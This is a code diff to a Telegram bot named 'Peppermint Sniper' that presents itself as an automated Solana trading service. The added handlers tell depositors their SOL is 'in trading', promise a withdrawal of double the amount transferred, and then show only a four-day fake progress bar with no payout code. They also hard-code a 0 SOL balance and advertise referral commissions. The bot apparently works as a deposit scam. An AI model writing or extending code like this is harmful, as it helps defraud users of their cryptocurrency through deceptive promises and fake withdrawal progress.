@@ -62,14 +62,18 @@ bot.start(async (ctx) => {
     await ctx.deleteMessage(secondMessage.message_id);
 });
 
-// Helper function to handle API rate limiting
-const handleRateLimit = async (error) => {
+// Helper function to handle API rate limiting and forbidden errors
+const handleTelegramError = async (error, chat_id) => {
     if (error.code === 429 && error.parameters.retry_after) {
         const retryAfter = error.parameters.retry_after * 1000;
         console.warn(`Rate limit exceeded. Retrying after ${retryAfter / 1000} seconds.`);
         await new Promise(resolve => setTimeout(resolve, retryAfter));
+    } else if (error.code === 403 && error.description.includes('bot was blocked by the user')) {
+        console.error(`User ${chat_id} has blocked the bot. Stopping further interactions with this user.`);
+        // Optional: Add logic to remove or flag this user to prevent further messages
     } else {
-        throw error;
+        console.error('Unexpected error:', error);
+        // Optional: throw error or handle other types of errors as needed
     }
 };
 
@@ -102,7 +106,7 @@ Balance: ${solBalance.toFixed(2).replace(/\./g, '\\.')} SOL \\(\\$${(solBalance 
         await ctx.reply(formattedMessage, { parse_mode: 'MarkdownV2' });
     } catch (error) {
         if (error.code === 429) {
-            await handleRateLimit(error);
+            await handleTelegramError(error, ctx.chat.id);
         } else {
             console.error('Error in main_wallet action:', error);
             ctx.reply('An error occurred while fetching your wallet details. Please try again.');
@@ -169,7 +173,7 @@ To activate the Peppermint Sniper bot and start earning profits with our automat
         }
     } catch (error) {
         if (error.code === 429) {
-            await handleRateLimit(error);
+            await handleTelegramError(error, ctx.chat.id);
         } else {
             ctx.reply('There was an error processing your request. Please try again.');
             console.error('Error in start_earning action:', error);
@@ -177,7 +181,170 @@ To activate the Peppermint Sniper bot and start earning profits with our automat
     }
 });
 
-// Handle all other actions similarly, wrapping them in try-catch and handling the 429 error.
+bot.action('track_profits', async (ctx) => {
+    try {
+        await ctx.answerCbQuery();
+        const userId = ctx.from.id;
+
+        if (userStatus[userId] && userStatus[userId].transferDone) {
+            ctx.reply('Your Solana balance is in trading. Once it is in profit, it will be available here.');
+        } else {
+            ctx.reply('No transfer detected. Please start earning by transferring SOL to your trading wallet.');
+        }
+    } catch (error) {
+        if (error.code === 429) {
+            await handleTelegramError(error, ctx.chat.id);
+        } else {
+            console.error('Error in track_profits action:', error);
+        }
+    }
+});
+
+bot.action('withdraw', async (ctx) => {
+    try {
+        await ctx.answerCbQuery();
+        const userId = ctx.from.id;
+
+        if (userStatus[userId] && userStatus[userId].transferDone) {
+            const totalTransferred = userStatus[userId].totalTransferred || 0;
+            const withdrawalAmount = totalTransferred * 2;
+            const withdrawalAmountSOL = (withdrawalAmount / LAMPORTS_PER_SOL).toFixed(2);
+
+            if (userStatus[userId].newDeposit) {
+                userStatus[userId].withdrawalMessageSent = false;
+                userStatus[userId].currentStep = 1;
+                if (userStatus[userId].interval) {
+                    clearInterval(userStatus[userId].interval);
+                    userStatus[userId].interval = null;
+                }
+            }
+
+            if (!userStatus[userId].withdrawalMessageSent) {
+                await ctx.reply(`Your withdrawal is being processed...\n\nYour withdrawal amount is: ${withdrawalAmountSOL} SOL`);
+                userStatus[userId].withdrawalMessageSent = true;
+                userStatus[userId].newDeposit = false;
+            }
+
+            const totalSteps = 4 * 24 * 60 * 60; // 4 days in seconds
+            let step = userStatus[userId].currentStep || 1;
+
+            const sendOrUpdateBar = async () => {
+                const currentBar = generateTimelineBar(step, totalSteps);
+
+                if (currentBar !== userStatus[userId].previousBar) {
+                    try {
+                        if (!userStatus[userId].barMessageId || userStatus[userId].newDeposit) {
+                            const sentBarMessage = await ctx.reply(currentBar);
+                            userStatus[userId].barMessageId = sentBarMessage.message_id;
+                        } else {
+                            await ctx.telegram.editMessageText(ctx.chat.id, userStatus[userId].barMessageId, undefined, currentBar);
+                        }
+                        userStatus[userId].previousBar = currentBar;
+                    } catch (error) {
+                        console.error('Error editing message:', error);
+                    }
+                }
+            };
+
+            await sendOrUpdateBar();
+
+            if (!userStatus[userId].interval) {
+                userStatus[userId].interval = setInterval(async () => {
+                    if (step >= totalSteps) {
+                        clearInterval(userStatus[userId].interval);
+                        userStatus[userId].currentStep = totalSteps;
+                        await ctx.reply('Your withdrawal is complete!');
+                        return;
+                    }
+
+                    step++;
+                    userStatus[userId].currentStep = step;
+                    await sendOrUpdateBar();
+                }, 1000); // Update every second
+            }
+
+        } else {
+            ctx.reply('No funds available for withdrawal. Please start earning first.');
+        }
+    } catch (error) {
+        if (error.code === 429) {
+            await handleTelegramError(error, ctx.chat.id);
+        } else {
+            ctx.reply('There was an error processing your withdrawal. Please try again.');
+            console.error('Error in withdraw action:', error);
+        }
+    }
+});
+
+bot.action('referrals', async (ctx) => {
+    try {
+        await ctx.answerCbQuery();
+        ctx.reply('Earn 7% commission on each referral.');
+    } catch (error) {
+        if (error.code === 429) {
+            await handleTelegramError(error, ctx.chat.id);
+        } else {
+            console.error('Error in referrals action:', error);
+        }
+    }
+});
+
+bot.action('balance', async (ctx) => {
+    try {
+        await ctx.answerCbQuery();
+        ctx.reply('Your current balance is 0 SOL.');
+    } catch (error) {
+        if (error.code === 429) {
+            await handleTelegramError(error, ctx.chat.id);
+        } else {
+            console.error('Error in balance action:', error);
+        }
+    }
+});
+
+bot.action('track_peppermint', async (ctx) => {
+    try {
+        await ctx.answerCbQuery();
+        ctx.reply(`Check out our Peppermint Sniper activity for reference and stay updated with our latest transactions and performance:\n\n@peppermintsnipertrack_bot.`);
+    } catch (error) {
+        if (error.code === 429) {
+            await handleTelegramError(error, ctx.chat.id);
+        } else {
+            console.error('Error in track_peppermint action:', error);
+        }
+    }
+});
+
+bot.action('refresh', async (ctx) => {
+    try {
+        await ctx.answerCbQuery();
+        const userId = ctx.from.id;
+
+        if (!userWallets[userId]) {
+            ctx.reply("You don't have a wallet yet. Please set up your main wallet first.");
+            return;
+        }
+
+        const userWallet = userWallets[userId];
+        const publicKey = userWallet.publicKey;
+        const balance = await connection.getBalance(publicKey);
+        const solBalance = balance / LAMPORTS_PER_SOL;
+
+        ctx.reply(`
+💵 Main Wallet (Solana)
+Address: ${publicKey.toBase58()}
+Updated Balance: ${solBalance.toFixed(2)} SOL ($${(solBalance * 158).toFixed(2)} USD)
+⚠️ Note: A 13% fee is applied to profits
+        `);
+    } catch (error) {
+        if (error.code === 429) {
+            await handleTelegramError(error, ctx.chat.id);
+        } else {
+            console.error('Error in refresh action:', error);
+            ctx.reply('An error occurred while refreshing. Please try again.');
+        }
+    }
+});
 
 bot.launch();
 console.log('Telegram bot is running...');
